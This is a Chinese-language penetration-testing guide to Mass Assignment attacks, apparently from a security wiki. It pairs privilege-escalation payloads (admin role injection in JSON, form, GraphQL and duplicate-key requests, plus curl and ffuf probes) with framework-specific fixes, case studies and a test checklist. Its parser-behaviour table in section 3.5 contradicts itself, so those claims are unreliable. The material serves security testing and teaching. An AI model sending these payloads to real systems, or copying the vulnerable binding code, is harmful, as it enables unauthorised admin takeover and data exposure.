---
attack_surface: [认证/授权绕过, 配置缺陷]
impact: [权限提升, 完整性破坏, 身份伪造]
risk_level: 高
prerequisites:
  - HTTP/JSON 协议基础
  - Burp Suite 或同类 HTTP 代理操作
  - RESTful API 设计理解
related_techniques:
  - idor
  - parameter-pollution
  - json-interoperability
  - prototype-pollution
  - broken-access-control
difficulty: 初级
tools:
  - Burp Suite (Repeater / Intruder)
  - ffuf
  - Postman
---

# Mass Assignment (CWE-915) — 不安全模型绑定的权限提升攻击全指南

> 关联文档：[IDOR](../IDOR/README.md) · [Parameter Pollution](../Parameter%20Pollution/README.md) · [JSON/XML/YAML Hacking](../../User%20input/Structured%20objects/json-xml-yaml-hacking/README.md) · [Node.js Express](../../../Application%20Frameworks/Node.js%20Express/README.md) · [Laravel](../../../Application%20Frameworks/Laravel/README.md)

---

# 0x01 原理与攻击面

## 1.0 TL;DR

Mass Assignment（CWE-915）发生在 API/Controller 将用户提交的 JSON/Form 数据**直接绑定**到服务端 Model/Entity 时，未通过显式 Allow-List 限制可绑定字段。如果 `roles`、`isAdmin`、`status`、`permissions` 等特权属性可被绑定，任何已认证用户即可通过追加这些字段实现垂直权限提升。

这不是注入攻击——Payload 中没有特殊字符、没有编码技巧、没有任何需要绕过的语法规则。攻击者只需要**在请求 Body 中多写一个字段**。正因如此，Mass Assignment 是渗透测试中最容易被跳过的漏洞之一：Burp Suite 的被动扫描器看不到它，WAF 检测不到它，代码审计中它看起来像"正常的参数传递"。

**核心防御**: 服务端通过 Allow-List（白名单）显式声明哪些字段可被客户端修改，拒绝所有未列出的字段。框架提供的 `$fillable`（Laravel）、`strong parameters`（Rails）、`@JsonIgnore`（Spring）等机制的本质都是同一个模式。

## 1.1 根本原理 — 为什么不安全绑定会改变权限

Mass Assignment 的发生链：

```
用户发送 PUT /api/users/42
Body: {"firstName": "Sam", "roles": [{"id": 1, "name": "ADMIN"}]}
  ↓
框架反序列化 JSON → User 对象
  ↓
ORM/DAL 生成: UPDATE users SET first_name='Sam', roles='[{"id":1,"name":"ADMIN"}]' WHERE id=42
  ↓
❌ 缺少: 字段级授权检查 — 调用者是否有权修改 roles 字段？
  ↓
数据库中 roles 被覆盖 → 用户 42 现在是管理员
```

关键事实：**JWT / Session Cookie 存在 ≠ 字段级授权检查已完成。** 认证回答了"你是谁"，路由授权回答了"你能访问这个端点吗"，但 Mass Assignment 发生在两者都通过之后——"你能修改这个对象的**所有字段**，还是只能修改**你被允许修改的字段**？"

## 1.2 Mass Assignment vs IDOR vs BAC — 术语辨析

| 术语 | 攻击对象 | 攻击方式 | 关系 |
|------|---------|---------|------|
| **IDOR** | 访问**他人的**对象 | 修改对象标识符（`id=42→41`） | 水平方向——"读别人的数据" |
| **Mass Assignment** | 修改**自己的**对象属性 | 追加特权字段（`{"role":"admin"}`） | 垂直方向——"提升自己的权限" |
| **BAC** | 两者都是 BAC 的子类 | — | OWASP Top 10 A01:2021 父类别 |

Mass Assignment 和 IDOR 经常串联：通过 IDOR 泄露管理员角色 ID/名称 → 通过 Mass Assignment 将角色分配给自己的账户 → 垂直提权完成。

## 1.3 攻击面模型 — 特权属性可出现在请求的何处

| 位置 | 示例 | 常见场景 |
|------|------|----------|
| JSON Body | `{"role": "admin", "isAdmin": true}` | RESTful API (PUT/PATCH) |
| Form Body (URL-Encoded) | `role=admin&isAdmin=true` | 传统 Web 应用 |
| Nested qs Syntax | `user[role]=admin&profile[isAdmin]=true` | Express `extended: true` |
| GraphQL Mutation | `mutation { updateUser(id:42, role:ADMIN) {...}}` | GraphQL API |
| XML Body | `<user><role>admin</role></user>` | SOAP/XML API |
| Multipart Form | `--boundary\nContent-Disposition: form-data; name="role"\n\nadmin` | 文件上传 + 属性更新 |
| HTTP Header (少见) | `X-User-Role: admin` | 微服务 / API Gateway 信任头 |

> 核心原则：**只要客户端可以向服务端发送一个键值对，且服务端将其解释为对象属性——就存在 Mass Assignment 的潜在攻击面。**

---

# 0x02 发现与检测

## 2.1 端点启发式识别

优先关注涉及**自身资源更新**的端点：

- `PUT / PATCH /api/users/{id}`
- `PATCH /me`、`PUT /profile`、`POST /account/update`
- `PUT /api/orders/{id}`、`PATCH /api/orders/{id}/status`
- `POST /api/team/{id}/members`（创建子资源时可能携带额外属性）

启发式信号：

- 响应中回显了客户端未发送的服务端管理字段（`roles`、`status`、`isAdmin`、`permissions`、`plan`、`credit`）
- 客户端 JS Bundle 中包含角色名称常量、权限枚举、管理员标识
- API 文档（Swagger/OpenAPI）中 Model Schema 包含 `writeOnly: false` 的特权字段
- 后端序列化器不拒绝未知字段（无 `@JsonIgnoreProperties(ignoreUnknown = false)`）

## 2.2 Schema 泄露检测 — 响应回显法

执行一次正常更新（仅携带安全字段），观察完整 JSON 响应结构。响应中出现的、但你未发送的字段 = 潜在的可绑定特权属性。

**示例**：

```http
PUT /api/users/12934 HTTP/1.1
Host: target.example
Content-Type: application/json

{
  "id": 12934,
  "email": "user@example.com",
  "firstName": "Sam",
  "lastName": "Curry"
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 12934,
  "email": "user@example.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "roles": null,           ← 未发送但回显：可能是特权字段
  "status": "ACTIVATED",   ← 未发送但回显：可能是状态字段
  "filters": [],           ← 未发送但回显
  "token": null,           ← 未发送但回显：可能是会话相关
  "keepNamePrivate": false ← 未发送但回显：可能是隐私控制
}
```

回显中 `null` 的空数组/对象字段是最佳候选——它们暗示了该字段的数据结构，可以直接用于构造 Payload。

## 2.3 客户端 JS Bundle 侦察

从客户端 JS Bundle 中提取角色名称、权限枚举和 Model 字段名：

```bash
# 下载 JS Bundle 并搜索角色相关字符串
strings app.*.js | grep -iE "role|admin|isAdmin|permission|status|plan|credit" | sort -u

# 如果有 Source Map，直接查看 DTO 定义
# 搜索模式: "roles", "ADMIN", "STAFF", "MODERATOR", "SUPERADMIN"
```

关键搜索目标：
- 角色名常量（`ROLE_ADMIN`、`UserRole.ADMIN`、`"ADMIN"`）
- 权限枚举（`Permissions.CAN_MANAGE_USERS`）
- 下拉选项列表（`<option value="1">Admin</option>`）
- GraphQL 内省结果中的 `Role` 枚举类型
- 验证 Schema（Yup/Zod/IoTS）中列出的所有字段

## 2.4 SSPP 驱动的 Mass Assignment 检测

当用户输入被嵌入到服务端发起的内部 API 请求中时（Server-Side Parameter Pollution），攻击者可以通过注入 JSON 字段来间接触发 Mass Assignment。详见 [Parameter Pollution](../Parameter%20Pollution/README.md#0x04-Server-Side%20Parameter%20Pollution)。

**场景**：前端接收用户输入的 `name` 参数，服务端将其拼接到内部 JSON Body 中：

```
用户请求: POST /edit-profile
Body: name=peter

服务端构造的内部请求:
PATCH /users/7312/update
Body: {"name": "peter", "access_level": "user"}
```

**SSPP Payload**：

```
name=peter","access_level":"administrator
```

拼接后的内部 JSON：

```json
{"name": "peter","access_level":"administrator", "access_level": "user"}
```

如果内部 API 的 JSON 解析器采用 last-wins 策略，且 `access_level` 字段可绑定 → 权限提升。检测时注意区分 Form 上下文（用 `"` 闭合）和 JSON 上下文（用 `\"` 闭合）的转义差异。

## 2.5 自动化检测工具

| 工具 | 用途 | 使用方式 |
|------|------|---------|
| **Burp Repeater** | 手动追加字段，观察响应变化 | 在正常请求 Body 中追加 `"role":"admin"` |
| **Burp Intruder** | 批量测试常见特权字段名 | Sniper 模式，Wordlist = 特权字段列表 |
| **ffuf** | 参数发现和模糊测试 | `ffuf -u URL -d '{"FUZZ":"admin"}' -H "Content-Type: application/json" -w wordlist` |
| **Postman** | API 探索和 Schema 分析 | 对比 GET 响应字段 vs PUT 接受的字段 |
| **GraphQL Voyager** | GraphQL Schema 可视化 | 查看 Mutation 接受的完整 Input Type |

标准特权字段探测词表（优先级排序）：

```
roles, role, isAdmin, admin, permissions, status, plan, type, group, credit,
balance, verified, approved, active, suspended, emailVerified, isStaff,
isSuperuser, isModerator, accountType, subscription, accessLevel, scope,
organization, tenant, owner, managedBy, internal, flags
```

---

# 0x03 利用技术

## 3.1 直接角色/权限提升

一旦从 Schema 泄露或 JS Bundle 中确定了特权字段名和格式，直接在同一次更新请求中追加：

```http
PUT /api/users/12934 HTTP/1.1
Host: target.example
Content-Type: application/json

{
  "id": 12934,
  "email": "user@example.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "roles": [
    { "id": 1, "description": "ADMIN role", "name": "ADMIN" }
  ]
}
```

**注意事项**：

- 如果 Token 中包含角色声明（如 JWT `roles` claim），需要在 Mass Assignment 成功后**重新登录或刷新 Token**——旧 Token 中的声明不会自动更新
- 角色标识符（ID/名称）通常从 JS Bundle 或 API 文档中提取。搜索 `"ADMIN"`、`"STAFF"`、数字角色 ID 等
- 某些应用将角色存储为**字符串数组**（`["admin"]`）而非对象数组。尝试两种格式
- 观察响应是否回显你设置的值——如果成功回显但重新登录后未生效，可能存在**二次校验**（Token 签发时从独立服务查询角色）

## 3.2 嵌套对象创建与子资源注入

Mass Assignment 不仅限于修改现有字段——某些 ORM 允许通过嵌套对象**创建关联实体**：

```json
{
  "email": "attacker@evil.com",
  "organizations": [
    { "id": 1, "name": "Target Corp", "role": "OWNER" }
  ]
}
```

如果 ORM 配置了 `cascade: true` 或 `save: { children: true }`，这个请求可能：
1. 创建 `attacker@evil.com` 用户
2. 同时建立该用户对 "Target Corp" 组织的 OWNER 级关联

这在多租户 SaaS 中尤其危险——攻击者可以跨组织边界建立未授权的关联关系。

## 3.3 通过 qs 参数注入实现 Mass Assignment

Express 的 `express.urlencoded({ extended: true })` 使用 `qs` 库解析嵌套对象语法。如果应用使用 URL-Encoded Body 且开启了 `extended: true`，攻击者可以通过参数名注入嵌套属性：

```bash
# qs 嵌套语法 — Mass Assignment 探测
curl -X POST 'https://target.example/api/update' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'profile[role]=admin&profile[isAdmin]=true'
```

等价于 JSON：

```json
{"profile": {"role": "admin", "isAdmin": true}}
```

如果应用将 `req.body.profile` 直接合并到用户 Model 中，`role` 和 `isAdmin` 即被绑定。同样适用于 Query String 中的 `req.query`（如果应用将 Query 参数合并到 Model）。

## 3.4 GraphQL Mass Assignment

GraphQL Mutation 的 Input Type 设计不良时，攻击者可以通过内省发现未文档化的特权字段：

```graphql
mutation UpdateProfile($input: UserUpdateInput!) {
  updateUser(input: $input) {
    id
    email
    role        # ← 内省泄露了 role 字段
  }
}
```

```json
{
  "input": {
    "id": 42,
    "email": "attacker@evil.com",
    "role": "ADMIN"
  }
}
```

GraphQL 特有的检测方法：
- 运行内省查询获取完整的 `UserUpdateInput` Input Type 定义
- 对比 `User` Type（查询返回）和 `UserUpdateInput`（Mutation 接受）——如果后者包含特权字段，即为攻击面
- 测试嵌套 Mutation：某些 GraphQL Schema 允许在 `updateUser` Mutation 中同时 `createOrganization` 并指定 `role: OWNER`

## 3.5 JSON 键冲突驱动的 Mass Assignment

当应用链中存在多个 JSON 解析器时（如 API Gateway → Auth Service → Business Service），攻击者可以利用重复键的不一致处理绕过字段校验：

```json
{
  "firstName": "Sam",
  "role": "user",
  "role": "admin"
}
```

| 解析器 | 看到的 role | 效果 |
|--------|------------|------|
| Python `json` (last-wins) | `admin` | Auth Service 放行（认为用户只有 user 角色） |
| Go `encoding/json` (last-wins) | `admin` | Business Service 写入 `admin` |
| Java Jackson (first-wins) | `user` | Auth Service 看到 `user` → 放行 |

**攻击模式**：Auth Service（Python FastAPI, last-wins）执行授权检查时看到 `role: user` → 校验通过 → 转发原始 JSON 给 Business Service（Go, last-wins 但 case-insensitive）→ 看到 `Role: admin` → 写入数据库。

详见 [JSON/XML/YAML Hacking](../../User%20input/Structured%20objects/json-xml-yaml-hacking/README.md) 了解完整的解析器差异矩阵。

---

# 0x04 框架陷阱与安全模式

## 4.1 Node.js (Express + Mongoose)

**易受攻击模式**：

```js
// req.body 中的所有字段（包括 roles/isAdmin）直接持久化
app.put('/api/users/:id', async (req, res) => {
  const user = await User.findByIdAndUpdate(req.params.id, req.body, { new: true });
  res.json(user);
});
```

**qs 嵌套注入**（当 `express.urlencoded({ extended: true })` 时）：

```bash
curl -X PUT 'https://target/api/users/42' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'firstName=Sam&roles[0][name]=ADMIN&roles[0][id]=1'
```

**安全模式**：

```js
// 显式 Allow-List + 所有权校验
app.put('/api/users/:id', async (req, res) => {
  const allowed = (({ firstName, lastName, nickName }) =>
    ({ firstName, lastName, nickName }))(req.body);
  const user = await User.findOneAndUpdate(
    { _id: req.params.id, owner: req.user.id },
    allowed,
    { new: true }
  );
  res.json(user);
});
// 角色变更通过独立的管理员端点处理，含服务端 RBAC 检查
```

**Sequelize** 同理——`Model.update(req.body, { where: { id } })` 同样易受攻击，使用 `fields` 选项限制可更新列。

## 4.2 Ruby on Rails

**易受攻击模式**（无 Strong Parameters）：

```ruby
def update
  @user.update(params[:user])  # roles/is_admin 可被客户端设置
end
```

**安全模式**（Strong Parameters + 无特权字段）：

```ruby
def user_params
  params.require(:user).permit(:first_name, :last_name, :nick_name)
end
```

Rails 从 4.0 开始引入 Strong Parameters，但遗留应用和 API-only 模式下手动 `permit` 可能遗漏特权字段。检查 `config.action_controller.action_on_unpermitted_parameters` 配置——默认是 `:log`（仅记录，不拒绝），应设为 `:raise` 或自定义 400 响应。

## 4.3 Laravel (Eloquent)

**易受攻击模式**：

```php
protected $guarded = []; // 所有字段可 Mass-Assign（危险）
```

或显式列出特权字段在 `$fillable` 中：

```php
protected $fillable = ['first_name', 'last_name', 'role', 'is_admin']; // role/is_admin 不应在此
```

**安全模式**：

```php
protected $fillable = ['first_name', 'last_name', 'nick_name']; // 角色/管理员字段不在此列
```

**相关 CVE**：

- **CVE-2025-48490** — `lomkit/laravel-rest-api` < 2.13.0 中，per-action 验证规则合并逻辑存在缺陷：后续定义覆盖先前的同名属性规则。攻击者可覆盖 `update` action 的 `filter` 规则，绕过字段验证实现 Mass Assignment。检测方式：`composer.lock` 中检查 `lomkit/laravel-rest-api` 版本 < 2.13.0；发送对 `/_rest/users?filters[0][column]=password` 的请求，若未被拒绝即存在漏洞。

## 4.4 Spring Boot (Jackson)

**易受攻击模式**：

```java
// 直接将请求体绑定到 Entity 并持久化
@PutMapping("/api/users/{id}")
public User update(@PathVariable Long id, @RequestBody User u) {
    return repo.save(u);
}
```

**安全模式** — DTO + 字段白名单：

```java
// 只包含允许客户端修改的字段
record UserUpdateDTO(String firstName, String lastName, String nickName) {}

@PutMapping("/api/users/{id}")
public UserDTO update(@PathVariable Long id, @RequestBody @Valid UserUpdateDTO dto) {
    User user = repo.findById(id).orElseThrow();
    user.setFirstName(dto.firstName());
    user.setLastName(dto.lastName());
    user.setNickName(dto.nickName());
    // 角色变更仅在 Admin Controller 中通过 RBAC 检查后执行
    return UserDTO.from(repo.save(user));
}
```

**补充措施**：

- 在 Entity 的特权字段上使用 `@JsonProperty(access = Access.READ_ONLY)` 或 `@JsonIgnore`
- 配置 `ObjectMapper` 拒绝未知属性：
  ```java
  objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);
  ```
- 使用 `@JsonIgnoreProperties(ignoreUnknown = false)` 在类级别强制严格解析

## 4.5 Django (DRF)

**易受攻击模式** — 使用 `Meta.fields = '__all__'` 或包含特权字段：

```python
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'  # 包括 is_staff, is_superuser, user_permissions
```

**安全模式** — 显式列出安全字段：

```python
class UserUpdateSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['first_name', 'last_name', 'nick_name']
        read_only_fields = ['email', 'is_staff', 'is_superuser', 'user_permissions', 'groups']
```

**DRF 特有的 Mass Assignment 入口**：
- 嵌套 Serializer 的 `create()` / `update()` 方法中手动处理关联对象
- `ManyToManyField` 通过 `PrimaryKeyRelatedField(many=True)` 直接接受 ID 列表
- ViewSet 的 `get_serializer_class()` 根据 action 返回不同 Serializer——确认 `update`/`partial_update` 使用的是受限 Serializer

## 4.6 Go (encoding/json)

**易受攻击模式** — 缺失 struct tag 或 tag 使用错误：

```go
type User struct {
    Username string               // 缺 tag → 默认可绑定（危险）
    IsAdmin  bool   `json:"-"`   // json:"-" → 正确：忽略此字段
    Role     string `json:"-,omitempty"` // ← 错误！json tag 是 "-," 而非 "-"
}
```

`json:"-,omitempty"` 的实际效果：字段的 JSON 键名为 `-`，攻击者发送 `{"-": "admin"}` 即可绑定。**正确写法是 `json:"-"`（仅连字符，无逗号后续内容）。**

**安全模式**：

```go
type UserUpdateDTO struct {
    FirstName string `json:"firstName"`
    LastName  string `json:"lastName"`
    NickName  string `json:"nickName"`
    // IsAdmin 和 Role 不在 DTO 中 → 不可绑定
}

func UpdateUser(w http.ResponseWriter, r *http.Request) {
    var dto UserUpdateDTO
    decoder := json.NewDecoder(r.Body)
    decoder.DisallowUnknownFields()  // 拒绝未知字段
    if err := decoder.Decode(&dto); err != nil {
        http.Error(w, "invalid fields", 400)
        return
    }
    // 仅复制 dto 中的安全字段到 entity
}
```

**Go JSON 解析器的特殊行为**（详见 [JSON/XML/YAML Hacking](../../User%20input/Structured%20objects/json-xml-yaml-hacking/README.md)）：

- **Case-Insensitive Matching**: `{"IsAdmin": true}` 可以匹配 `IsAdmin` 字段（即使 JSON tag 是 `isAdmin`），攻击者可以通过大小写变体绕过字段名校验
- **Unicode Tricks**: `{"IsAdmın": true}` 可以匹配 `IsAdmin`（Unicode 规范化后等同）
- **Duplicate Key (Last-Wins)**: `{"role":"user","role":"admin"}` → `role = "admin"`
- **No Cross-Parser Consistency Guarantee**: Go `encoding/json` last-wins vs Java Jackson first-wins → 跨服务不一致

## 4.7 ASP.NET Core (Model Binding)

**易受攻击模式** — 直接绑定到 Entity：

```csharp
[HttpPut("api/users/{id}")]
public async Task<IActionResult> Update(int id, [FromBody] User user)
{
    _context.Users.Update(user);
    await _context.SaveChangesAsync();
    return Ok(user);
}
```

**安全模式** — DTO + `[Bind]` 属性：

```csharp
public class UserUpdateDTO
{
    public string FirstName { get; set; }
    public string LastName { get; set; }
    public string NickName { get; set; }
}

[HttpPut("api/users/{id}")]
public async Task<IActionResult> Update(int id, [FromBody] UserUpdateDTO dto)
{
    var user = await _context.Users.FindAsync(id);
    user.FirstName = dto.FirstName;
    user.LastName = dto.LastName;
    user.NickName = dto.NickName;
    // IsAdmin / Role 不在 DTO 中 → 不可修改
    await _context.SaveChangesAsync();
}
```

**补充措施**：
- 在 Entity 的特权属性上使用 `[BindNever]` 或 `[JsonIgnore]`
- 使用 `[Bind]` 属性限制 Controller Action 接受的字段：
  ```csharp
  public IActionResult Update([Bind("FirstName,LastName,NickName")] User user)
  ```
- 使用 `ModelMetadataType` 为 Entity 定义独立的元数据类，在 `ScaffoldColumn(false)` 中隐藏特权字段

---

# 0x05 真实案例研究

## 5.1 CVE-2025-48490 — lomkit/laravel-rest-api 验证规则覆盖

**影响版本**: `lomkit/laravel-rest-api` < 2.13.0

**漏洞原理**: 该包在处理 per-action 验证规则时，后定义的规则覆盖先前的同名属性规则——而非合并。攻击者可以在 `update` action 中覆盖 `filter` 规则，使原本受保护的字段跳过验证，实现 Mass Assignment。

**检测命令**:

```bash
# 静态检查
rg "lomkit/laravel-rest-api" composer.lock

# 动态测试 — 如果 filter 接受 password 列即为漏洞
curl -sk 'https://target/_rest/users?filters[0][column]=password&filters[0][operator]=='
```

**影响**: 字段验证被完全绕过 → Mass Assignment 写入任意数据库列 → 权限提升或数据篡改。

## 5.2 FIA Driver Categorisation — Mass Assignment 导致 F1 车手护照泄露

**来源**: [ian.sh/fia](https://ian.sh/fia) (Ian Carroll, Sam Curry, Gal Nagli — 2025)

**目标**: FIA Driver Categorisation 门户 (`driverscategorisation.fia.com`)，用于管理 F1 及各级别赛车手的 Bronze/Silver/Gold/Platinum 分级。

**发现过程**:

1. **注册测试账户** → 通过 PUT `/api/users/12934` 更新个人资料
2. **Schema 泄露** — 正常更新的 JSON 响应回显了未发送的字段：

```json
{
  "roles": null,
  "status": "ACTIVATED",
  "filters": [],
  "token": null,
  "keepNamePrivate": false,
  "secondaryEmail": null
}
```

3. **JS Bundle 侦察** — 从客户端 JS 中提取角色格式和 `ADMIN` 角色 ID
4. **Mass Assignment** — 在同一次 PUT 请求中追加 `roles` 数组：

```json
{
  "roles": [{"id": 1, "description": "ADMIN role", "name": "ADMIN"}]
}
```

5. **重新认证** — Token 刷新后获得管理员仪表盘访问权限
6. **验证影响** — 可加载任意车手的完整资料，包括：
   - 护照扫描件
   - 简历和赛车执照
   - 密码哈希
   - 电子邮件和电话号码
   - FIA 内部委员会决策评论

**披露时间线**:

| 日期 | 事件 |
|------|------|
| 2025-03-06 | 首次向 FIA 报告（邮件 + LinkedIn） |
| 2025-03-06 | FIA 初步响应，站点下线 |
| 2025-03-10 | FIA 确认全面修复 |
| 2025-10-22 | 博客公开发布 |

**根因**: API 层完全信任客户端提供的字段名。`PUT /api/users/{id}` 端点接受任意 JSON 键并直接映射到数据库列，无 Allow-List。

**教训**: Schema 泄露（响应回显）是 Mass Assignment 最可靠的检测信号——它本身就是漏洞存在的物理证据。

## 5.3 其他已知 Mass Assignment 相关漏洞

| CVE / 案例 | 影响框架 | 核心问题 |
|-----------|---------|---------|
| CVE-2024-48987 | Snipe-IT (Laravel) | `Passport::withCookieSerialization()` 启用后，序列化 Cookie 中的字段可被 Mass-Assign |
| CVE-2024-55555 | Invoice Ninja (Laravel) | `decrypt($hash)` 路由参数接受任意加密 Payload，解码后字段直接绑定到 Model |
| GitLab 2025 SAML Bypass | GitLab (Ruby) | XML 解析器差异 → SAML 断言中的属性被 Mass-Assign 到用户记录 |
| 2022 Zoom 0-Click RCE | Zoom (C++) | XML 解析器不一致 → 内部消息属性被覆盖 → 权限边界突破 |

---

# 0x06 攻击链与组合利用

## 6.1 IDOR → Schema 泄露 → Mass Assignment 提权

```
1. IDOR 读取管理员用户的 JSON 响应 → 发现角色/权限格式
2. 在自己的 PUT /api/users/{self_id} 请求中追加提取的特权字段
3. Mass Assignment 成功 → 垂直权限提升完成
```

详见 [IDOR](../IDOR/README.md#5.1-水平越权--垂直越权)。

## 6.2 SSPP → JSON 字段注入 → Mass Assignment

```
1. 识别将用户输入嵌入到服务端 JSON 请求中的端点
2. 注入闭合引号 + 特权字段 (如 name=peter","access_level":"administrator)
3. 服务端构造的 JSON 包含 attacker-controlled access_level
4. 内部 API 的 JSON 解析器接受该字段 → Mass Assignment 成功
```

详见 [Parameter Pollution](../Parameter%20Pollution/README.md#4.3-结构化数据注入)。

## 6.3 Prototype Pollution → Mass Assignment 属性覆盖

```
1. 通过 __proto__ 或 constructor.prototype 污染全局 Object 原型
2. 污染的属性 (如 isAdmin: true) 传播到所有新创建的对象
3. 当 Model 实例通过 Object.assign() 或展开运算符合并用户输入时
4. 污染的默认值覆盖了实际分配的属性 → Mass Assignment via prototype
```

在 Express + Mongoose 环境中尤为常见——`_.merge()`、`Object.assign()`、`for...in` 循环都可能将原型属性复制到 Model 实例中。

---

# 0x07 检测与防御

## 7.1 Allow-List（白名单）模式 — 核心防御

Mass Assignment 的**唯一有效防御**是服务端 Allow-List：显式声明哪些字段可被客户端修改，拒绝所有未列出的字段。

```
❌ Block-List (黑名单):  "禁止用户修改 role, isAdmin, status"
   → 每次新增特权字段都要更新黑名单，遗漏 = 漏洞

✅ Allow-List (白名单):  "用户只能修改 firstName, lastName, nickName"
   → 新增的任何字段默认被拒绝，新增 = 安全
```

**实现原则**:

1. **每个端点独立 Allow-List** — `/api/users/{id}` 的 Allow-List 不同于 `/api/admin/users/{id}`
2. **拒绝未知字段** — 配置框架在遇到未声明字段时抛出 400 错误（而非静默忽略）
3. **DTO 模式** — 请求 Body 只反序列化到仅包含安全字段的 DTO，再从 DTO 复制到 Entity
4. **分层 Allow-List** — API Gateway 层拒绝未知参数 + 服务层只复制 Allow-List 字段 + ORM 层 `$fillable` / `fields` 限制

## 7.2 DTO 模式与分层架构

```
Request Body (任意 JSON)
    │
    ▼
DTO (Data Transfer Object) ← 第一道 Allow-List：只反序列化安全字段
    │                        DisallowUnknownFields() / FAIL_ON_UNKNOWN_PROPERTIES
    ▼
Service Layer ← 第二道 Allow-List：只复制 DTO 中的字段到 Entity
    │            业务逻辑校验（如权限检查、速率限制）
    ▼
Entity / Model ← 第三道 Allow-List：ORM 层 $fillable / fields
    │
    ▼
Database
```

三层 Allow-List 不是过度防御——任何一层的遗漏都应该被下一层捕获。Single Point of Failure 在 Mass Assignment 防御中是不可接受的。

## 7.3 框架特定防御最佳实践

| 框架 | 机制 | 配置 |
|------|------|------|
| **Express/Mongoose** | 解构提取 Allow-List 字段 | `const { firstName, lastName } = req.body` |
| **Express/Mongoose** | `findOneAndUpdate` + 所有权条件 | `{ _id: id, owner: req.user.id }` |
| **Rails** | Strong Parameters | `params.require(:user).permit(:first_name, :last_name)` |
| **Rails** | 拒绝未允许参数 | `config.action_controller.action_on_unpermitted_parameters = :raise` |
| **Laravel** | `$fillable` 白名单 | `protected $fillable = ['first_name', 'last_name']` |
| **Laravel** | `$guarded` 黑名单（反模式）| `protected $guarded = ['id', 'role', 'is_admin']` — 不推荐 |
| **Spring Boot** | DTO Record | `record UserUpdateDTO(String firstName, String lastName) {}` |
| **Spring Boot** | Jackson 拒绝未知属性 | `FAIL_ON_UNKNOWN_PROPERTIES = true` |
| **Django DRF** | Serializer `fields` 白名单 | `fields = ['first_name', 'last_name']` |
| **Django DRF** | `read_only_fields` | `read_only_fields = ['is_staff', 'is_superuser']` |
| **Go** | `json:"-"` 忽略字段 | `IsAdmin bool \`json:"-"\`` |
| **Go** | `DisallowUnknownFields()` | `decoder.DisallowUnknownFields()` |
| **ASP.NET Core** | DTO 类 | 创建不含特权属性的独立 DTO 类 |
| **ASP.NET Core** | `[JsonIgnore]` / `[BindNever]` | 在 Entity 特权属性上标记 |

## 7.4 运行时监控与异常检测

1. **审计日志**: 记录每次属性变更的 `(user_id, object_type, object_id, changed_fields, old_values, new_values, timestamp)` 元组。特权字段的变更应有独立的告警通道
2. **异常检测规则**:
   - 同一用户在短时间内对**同一个** `object_id` 执行了字段变更（可能的 Mass Assignment 探测）
   - 用户修改了 Allow-List 之外的字段（`DisallowUnknownFields` 触发的 400 错误聚类）
   - 用户权限在**非管理员端点**上发生了变化（如 `PUT /api/me` 触发了 `role` 变更）
3. **速率限制**: 对同一端点、不同 user_id 的连续 PUT/PATCH 请求限速——防止遍历式 Mass Assignment
4. **Schema 快照对比**: 定期对比生产 API 响应和批准的 Schema——发现未预期的特权字段泄露

## 7.5 Mass Assignment 安全测试清单

**发现阶段**:

- [ ] 已识别应用中所有接受 JSON/Form Body 的 PUT/PATCH/POST 端点
- [ ] 已记录每个端点响应中回显的**所有字段**（包括客户端未发送的字段）
- [ ] 已检查每个端点的 API 文档 / GraphQL Schema 中是否包含特权字段
- [ ] 已从 JS Bundle 中提取角色名、权限枚举、Model 字段名
- [ ] 已测试 `express.urlencoded({ extended: true })` 的 qs 嵌套语法注入

**测试阶段**:

- [ ] 已在每个已发现的可绑定特权字段上测试追加注入
- [ ] 已测试所有角色/权限格式（字符串、数组、对象数组、ID 列表）
- [ ] 已在 Mass Assignment 成功后执行 Token 刷新/重新登录
- [ ] 已测试嵌套对象创建（通过 User Update 创建 Organization 关联）
- [ ] 已测试 GraphQL Mutation 中的未文档化字段
- [ ] 已测试 JSON 重复键绕过（`"role":"user","role":"admin"`）
- [ ] 已测试大小写变体绕过（`"Role":"admin"`, `"ROLE":"admin"`）
- [ ] 已测试 SSPP JSON 注入 → 内部 API Mass Assignment

**防御验证**:

- [ ] 确认服务端拒绝未知字段（`DisallowUnknownFields` 生效）
- [ ] 确认 Allow-List 而非 Block-List 策略
- [ ] 确认 DTO 模式——Entity 不直接暴露给 Request Body
- [ ] 确认角色变更仅在独立的管理员端点通过 RBAC 执行
- [ ] 确认审计日志记录特权字段变更事件

---

## 参考资料

- [FIA Driver Categorisation: Admin Takeover via Mass Assignment of roles — Full PoC](https://ian.sh/fia)
- [OWASP Top 10 A01:2021 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [CVE-2025-48490 — lomkit/laravel-rest-api validation override → Mass Assignment](https://advisories.gitlab.com/pkg/composer/lomkit/laravel-rest-api/CVE-2025-48490/)
- [Trail of Bits — Unexpected Security Footguns in Go's Parsers](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/)
- [Bishop Fox — An Exploration of JSON Interoperability Vulnerabilities](https://bishopfox.com/blog/json-interoperability-vulnerabilities)
